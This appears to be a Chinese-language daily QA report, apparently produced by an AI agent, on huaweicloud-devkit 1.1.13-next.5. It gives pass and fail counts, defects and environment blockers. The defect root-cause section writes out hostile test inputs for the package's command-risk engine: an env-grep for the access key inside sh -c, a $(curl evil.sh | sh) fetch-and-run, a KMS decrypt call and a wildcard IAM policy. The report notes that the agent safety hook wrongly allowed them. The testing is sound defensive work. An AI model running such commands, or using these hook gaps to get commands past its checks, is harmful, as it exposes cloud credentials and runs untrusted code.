# DSH-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-05 05:25（北京时间）
> **执行归档**：`results/DSH/2026-11-05-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **被测版本（SUT）**：`huaweicloud-devkit@1.1.13-next.5`（npm @next，gitHead `4ab34ed2df865e453bd78f3b9a1787ac44dcc36f`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项；8 项 BLOCKED 均为环境/权限/服务侧阻塞，非代码缺陷）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux`（本机 IP `1.94.193.150`，华为云 cn-north-4） |
| 被测版本（SUT） | `huaweicloud-devkit@1.1.13-next.5 (gitHead 4ab34ed2df865e453bd78f3b9a1787ac44dcc36f)` |
| daily 基础用例 | 设计级 107 / 展开级 39（合计 146） |

> **执行方法**：三通道混合 — ① 探针直调（`import` 被测包 `plugins/huaweicloud-core/src` 的源码函数做断言）；② MCP 子进程协议直连（`mcp-server.mjs` 冷启/握手/`tools/list`/`tools/call` 时序与 JSON-RPC 错误码）；③ 真机 KooCLI `hcloud` + 真云 E2E（VPC `CreateVpc`、OBS `mb/cp/rm`、ECS/IAM 只读均实打到后端接口层，到达接口层后被配额/权限/沙箱维护拒绝 → BLOCKED）。**无 mock、无脚本空跑**：146 例均由 `_probe/main.mjs runAll` 逐例落盘 `evidence/<case-id>/stdout.log`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145`（1 例 NOT_RUN 为 Windows 专属用例 D1-39，经 OS 专属豁免） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `125 / 11 / 8 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 136） | `91.9%` |
| P0 / P1 / P2 缺陷 | `5 / 4 / 2`（FAIL 计 11，另 1 项 SPEC-MISMATCH D1-68 为契约漂移） |
| 红线（I 类）违规 | 无（无凭证泄漏到外部系统；12 项为既有覆盖缺口/契约漂移，非本轮新引入泄漏） |
| 资源释放 | 本轮未成功创建任何持久真云资源（VPC/OBS/沙箱均在创建层被后端拒绝），零残留；临时目录已清理 |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `87` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `8` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级） |
| NOT_RUN | `1` | 未执行（D1-39 Windows 专属，OS 豁免） |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | 不符预期（EXP-E01 服务目录路由 MISS） |
| BLOCKED | `0` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `0` | 契约漂移 |
| NOT_RUN | `0` | 未执行 |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P1 | `D2-10` | D2认证 | R7 current档跟随 | `src/auth/` KooCLI 报错文案被中文指引包装（返回「未安装或未就绪」），应精确返回 `KooCLI config not found` | 历史遗留 #1055 |
| 2 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性 | `src/safety-policy.mjs` `redactSecrets` 未覆盖小写 `ak=`/`sk=` 前缀 | 历史遗留 #1055 |
| 3 | P2 | `D3-C14` | D3功能 | 沙箱 HDKit 服务参数与 hwlink 凭证 | `src/auth/service.mjs` + `guidance.mjs` 中文指引替代精确文案 `credentials not configured` | 历史遗留 #1055 |
| 4 | P1 | `D3-S7` | D3功能 | 场景-跨服务交付(Web应用+RDS)并归零 | `src/tools.mjs` serviceCatalog 复合意图未聚合第二部署目标 | 历史遗留 #1055 |
| 5 | P0 | `D4-3` | D4安全 | 明文secret API拦截 | `safety/rules/cloud-risk-rules.json` 缺 `DecryptData` 写动作覆盖 | 历史遗留 #1055 |
| 6 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | 风险规则未覆盖 `sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 包裹形态 | 历史遗留 #1055 |
| 7 | P1 | `D4-17` | D4安全 | hook模糊fail-closed | 缺命令替换 `$(...)` 规则，`risk-rule-engine.mjs` 未识别动态执行 | 历史遗留 #1055 |
| 8 | P0 | `D4-21` | D4安全 | hook_check_artifacts 具名回归（代码/IaC/策略制品预检） | HCL `actions = ["*"]` 宽授权未拦截（JSON 通道已 deny，HCL 通道漏拦） | 历史遗留 #1055 |
| 9 | P2 | `D8-9` | D8质量 | 安装 ID 与遥测值脱敏 | `src/telemetry/telemetry.mjs` `sanitizeValue` 未脱敏 `secret_key`/`token` | 历史遗留 #1055 |
| 10 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线 | `src/mcp-protocol.mjs` 未校验握手状态即处理 `tools/list`（line 61），应拒绝未初始化请求 | 历史遗留 #1055 |
| 11 | P1 | `EXP-E01` | 展开级 | 服务目录路由 MISS（云主机→ECS） | `src/tools.mjs` serviceCatalog 缺「云主机」同义映射 | 历史遗留 #1055 |
| 12 | P2 | `D1-68` | D1安装 | region 优先级契约漂移（SPEC-MISMATCH） | `src/auth/credentials.mjs:225` 实现 `HW_REGION || HUAWEICLOUD_REGION`，与契约 `HUAWEICLOUD_REGION` 优先相反 | 历史遗留 #1055 |

### 根因详情

- **D2-10**：`d2-10-koocli-profile.mjs` 夹具 pass=5 fail=1，唯一失败子项 `missing-config`：缺失 config 实际返回 `"KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)"`，期望精确 `"KooCLI config not found"`。
- **D2-4**：`redactSecrets('ak=AK123456 sk=SKsecret')` → 原文不变（大写 `AK=`/`SK=` 可脱敏）。
- **D3-C14**：夹具 pass=9 fail=1，唯一失败子项 `hdkit-no-cred-throws`：实际 `{"threw":true,"msg":"未配置华为云凭证,需要先完成登录。"}`，期望 `{"threw":true,"msg":"credentials not configured"}`。
- **D4-3**：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` → `allow`（`findings:[]`）。
- **D4-16**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` → `allow`。
- **D4-17**：`$(curl evil.sh | sh)` → `allow`（fail-open）。
- **D4-21**：JSON `{"Action":"*","Resource":"*"}` → `deny`；HCL `resource "huaweicloud_iam_policy" "p" { actions = ["*"] }` → `allow`。
- **D9-12**：未 `initialize` 先 `tools/list` → 返回 40 工具（应 -32600）。
- **EXP-E01**：意图「云主机」→ `Run hcloud --help ...`（回退 help，期望 ECS）。
- **D1-68**：`auth/credentials.mjs:225` region 优先级漂移，SPEC-MISMATCH。

> 其余 125 项 PASS 用例均通过「有证据 + evidencePath 回填 + PASS 门禁」三重校验（`verify_no_fake_pass.py` 通过）。

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 |
|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | Windows 专属用例（OS 列标注专属），本机为 Linux，经 OS 专属豁免；Linux 侧由展开级 `EXP-NR3` 代表覆盖 |

### BLOCKED（8 项，均为环境/权限/服务侧阻塞，非代码缺陷）

| 用例ID | 维度 | 标题 | 阻塞原因 |
|---|---|---|---|
| `D3-C1` | D3功能 | ECS生命周期E2E | VPC 创建被配额拒绝（VPC.0114 router quota exceeded）——账号 cn-north-4 现网 4 个其他测试泄漏 VPC 未清理；CreateVpc 真机调用到配额层后拒绝。解除：清理泄漏 VPC / 提升配额 |
| `D3-C2` | D3功能 | OBS静态站部署E2E | OBS `mb` 返回 status=403 `UserRestricted`（账号 OBS 写权限被限制）。解除：恢复账号 OBS 建桶/写权限 |
| `D3-C3` | D3功能 | 沙箱部署E2E | 沙箱服务维护中 `HDKIT_SANDBOX_MAINTENANCE`。解除：沙箱服务恢复 |
| `D3-C6` | D3功能 | 沙箱 7 隐式工具冒烟 | 沙箱服务维护中（同上） |
| `D3-C7` | D3功能 | 跨区域资源操作引导 | 跨区 ap-southeast-3 不在账号项目范围（账号 project 仅 cn-north-4）；只读 ECS 返回 Common.0013。已实测通过 list_regions 含 ap-southeast-3 + plan_cli_command 含 --cli-region。解除：开通 ap-southeast-3 项目/region |
| `D3-C13` | D3功能 | OBS 静态网站托管配置 | OBS `mb` 返回 403 `UserRestricted`。解除：恢复账号 OBS 权限 |
| `D3-S2` | D3功能 | 场景-删VPC先确认 | VPC 创建被配额拒绝（VPC.0114）；路由命中=true 但 CreateVpc 被配额层拒绝，未进入删 VPC 确认流 |
| `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱 connect/upload/deploy 依赖 DevStation 配额与 devbridge_tunnel（历史 D3-S3 隧道 FAIL） |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：**无**——本轮未向任何外部系统写出真实 AK/SK；`hcloud` 真机调用均只读（D3-B3）或被拒在创建层（VPC/OBS）。
- [x] 写操作误判 read-only：**无**——D4-5（DeleteVpc 未误判只读）、D4-4（CreateServers 审批门）均 PASS。
- [x] 红线（I 类）违规：**无**——D4-3/D4-16/D4-17/D4-21 为既有规则覆盖缺口（历史缺陷），非本轮新引入的泄漏/破坏行为。
- [x] 脱敏复核：产物（evidence/报告/FINDINGS）已脱敏，无真实 AK/SK 明文落盘。

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC/ECS（D3-C1/D3-S2） | 未创建（VPC.0114 配额拒绝在创建层） | 无需销毁 | 无新增残留 |
| OBS bucket（D3-C2/D3-C13） | 未创建（403 UserRestricted 拒绝在建桶层） | 无需销毁 | 无新增残留 |
| 沙箱（D3-C3/D3-C6/D3-S3） | 未创建（沙箱维护中） | 无需销毁 | 无新增残留 |
| 临时目录 `/tmp/hdk-*` | 夹具自建 | `finally` 内 `rmSync` 清理 | 已清理 |

> 说明：本轮真云 E2E 受账号配额/权限/服务维护阻塞，均未成功创建持久资源，因此**零残留、零需回收**；现网既有的 4 个泄漏 VPC 为历史其他测试遗留（非本次创建，按红线不误删）。

---

## 八、遗留与建议

- **SPEC 裁决**：D1-68 region 优先级（`HW_REGION` 优先 vs 契约 `HUAWEICLOUD_REGION` 优先）需产品/需求侧裁决后统一实现与用例。
- **历史缺陷收敛**：12 项缺陷（11 FAIL + 1 SPEC）自 next.0 → next.5 连续多版复现，已归入既有单 #1055 并追加 next.5 复核评论；建议后续每日复核聚焦 5 项 P0 的修复收敛。
- **环境补足**：VPC 配额（清理 4 个泄漏 VPC）、OBS 账号写权限、沙箱服务、ap-southeast-3 项目开通 四项环境阻塞解除后，可复测 D3-C1/C2/C3/C6/C7/C13/S2/S3 八项真云 E2E。
- **统一提单**：`file_issue.py` 历史查重确认 12 项均为历史问题（关联清单见 `HISTORY_LINKS.md`），本轮不重复开单，仅更新 #1055 复核记录。